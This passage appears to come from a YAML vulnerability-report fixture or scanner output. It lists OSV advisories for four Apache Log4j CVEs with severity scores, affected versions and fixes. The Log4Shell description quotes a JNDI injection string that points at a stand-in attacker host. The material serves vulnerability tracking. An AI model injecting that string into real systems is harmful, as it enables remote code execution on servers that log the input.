        value:
          advisors:
            - advisor:
                name: "OSV"
              vulnerabilities:

                # -------------------------------------------------------------
                # [1/4] CRITICAL — Log4Shell (the most severe)
                # -------------------------------------------------------------
                - id: "CVE-2021-44228"
                  externalReferences:
                    - url: "https://github.com/advisories/GHSA-jfh8-c2jp-hdp3"
                      type: "ADVISORY"
                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
                      type: "CVE"
                    - url: "https://logging.apache.org/log4j/2.x/security.html"
                      type: "ARTICLE"
                  summary: "Log4Shell — Remote Code Execution via JNDI injection in log4j-core"
                  description: >
                    Apache Log4j2 versions 2.0-beta9 through 2.14.1 (excluding security
                    releases 2.12.2, 2.12.3, and 2.3.1) are vulnerable to a remote code
                    execution (RCE) attack where an attacker who can control log messages
                    or log message parameters can execute arbitrary code loaded from LDAP
                    servers when message lookup substitution is enabled.
                    The attacker injects a crafted string such as
                    ${jndi:ldap://attacker.com/a} into any field that log4j2 processes
                    (HTTP headers, user-agent, form fields, etc.).
                  severity:
                    - source: "NVD"
                      type: "CVSS3"
                      score: 10.0
                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
                      rating: "CRITICAL"
                    - source: "GITHUB"
                      type: "CVSS3"
                      score: 10.0
                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
                      rating: "CRITICAL"
                  affectedVersions: ">=2.0-beta9, <=2.14.1 (excl. 2.12.2, 2.12.3, 2.3.1)"
                  fixedVersion: "2.15.0"
                  patchedVersion: "2.17.1"
                  cwes:
                    - "CWE-917"
                    - "CWE-400"
                    - "CWE-20"

                # -------------------------------------------------------------
                # [2/4] CRITICAL — Log4Shell bypass (incomplete fix in 2.15.0)
                # -------------------------------------------------------------
                - id: "CVE-2021-45046"
                  externalReferences:
                    - url: "https://github.com/advisories/GHSA-p6xc-xr62-6r2g"
                      type: "ADVISORY"
                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-45046"
                      type: "CVE"
                  summary: "Log4Shell bypass — Context Lookup RCE in log4j-core 2.15.0 incomplete fix"
                  description: >
                    The fix for CVE-2021-44228 in Apache Log4j 2.15.0 was found to be
                    incomplete in certain non-default configurations. A remote attacker
                    with control over Thread Context Map (MDC) input data and with crafted
                    configuration that uses a Pattern Layout with a Context Lookup (e.g.,
                    $${ctx:loginId}) can construct a malicious input data string resulting
                    in a denial of service (DoS) attack or, in some environments,
                    remote code execution (RCE).
                    Affects: 2.0-beta9 through 2.15.0 (excl. 2.12.2, 2.12.3, 2.3.1).
                  severity:
                    - source: "NVD"
                      type: "CVSS3"
                      score: 9.0
                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
                      rating: "CRITICAL"
                    - source: "GITHUB"
                      type: "CVSS3"
                      score: 9.0
                      vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
                      rating: "CRITICAL"
                  affectedVersions: ">=2.0-beta9, <=2.15.0 (excl. 2.12.2, 2.12.3, 2.3.1)"
                  fixedVersion: "2.16.0"
                  cwes:
                    - "CWE-917"
                    - "CWE-400"

                # -------------------------------------------------------------
                # [3/4] HIGH — Infinite recursion DoS
                # -------------------------------------------------------------
                - id: "CVE-2021-45105"
                  externalReferences:
                    - url: "https://github.com/advisories/GHSA-8489-44mv-ggj8"
                      type: "ADVISORY"
                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-45105"
                      type: "CVE"
                  summary: "DoS via infinite recursion in self-referential log4j-core lookups"
                  description: >
                    Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect
                    from uncontrolled recursion from self-referential lookups. When the
                    logging configuration uses a non-default Pattern Layout with a
                    Context Lookup (e.g., ${ctx:loginId}), attackers with control over
                    Thread Context Map (MDC) input data can craft malicious input data
                    containing a recursive lookup, resulting in a StackOverflowError
                    that will terminate the process.
                  severity:
                    - source: "NVD"
                      type: "CVSS3"
                      score: 7.5
                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                      rating: "HIGH"
                    - source: "GITHUB"
                      type: "CVSS3"
                      score: 7.5
                      vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                      rating: "HIGH"
                  affectedVersions: ">=2.0-alpha1, <=2.16.0"
                  fixedVersion: "2.17.0"
                  cwes:
                    - "CWE-674"

                # -------------------------------------------------------------
                # [4/4] MODERATE — RCE via attacker-controlled configuration
                # -------------------------------------------------------------
                - id: "CVE-2021-44832"
                  externalReferences:
                    - url: "https://github.com/advisories/GHSA-vwqq-5vrc-xw9h"
                      type: "ADVISORY"
                    - url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44832"
                      type: "CVE"
                  summary: "RCE in log4j-core when attacker has write access to log4j configuration"
                  description: >
                    Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security
                    fix releases 2.3.2 and 2.12.4) are vulnerable to a remote code
                    execution (RCE) attack when a configuration uses a JDBC Appender with
                    a JNDI LDAP data source URI when an attacker has control of the
                    target LDAP server. This issue is distinct from CVE-2021-44228 as it
                    only applies to the log4j-core JAR file and requires the attacker
                    to have write access to the log4j configuration.
                  severity:
                    - source: "NVD"
                      type: "CVSS3"
                      score: 6.6
                      vector: "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H"
                      rating: "MODERATE"
                    - source: "GITHUB"
